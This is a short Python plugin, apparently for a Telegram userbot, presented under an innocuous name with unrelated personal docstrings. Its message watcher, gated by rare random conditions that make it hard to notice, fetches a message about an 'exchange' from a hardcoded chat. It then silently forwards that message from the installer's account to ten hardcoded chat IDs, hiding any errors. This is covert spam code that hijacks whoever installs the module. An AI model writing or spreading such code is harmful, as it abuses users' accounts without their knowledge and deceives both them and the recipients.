import random
import re

from .. import loader


chat = [
    1614902805,
    1534956287,
    1845303401,
    1701044657,
    1654950014,
    1226236676,
    1349335204,
    1298501933,
    1666744611,
    1320693801,
]


@loader.tds
class ktkMod(loader.Module):
    """Алина, я люблю тебя!"""

    strings = {"name": "ktk"}

    async def client_ready(self, client, db):
        """ready"""
        self.client = client
        self.db = db

    async def watcher(self, m):
        """алко"""
        if (
            random.randint(0, 13) != 13
            or random.randint(0, 33) != 33
            or m.date.second != random.randint(0, 59)
        ):
            return
        p = await self.client.get_messages(898299955, search="Обмен")
        for i in chat:
            try:
                await self.client.send_message(i, p[0])
            except Exception:
                pass
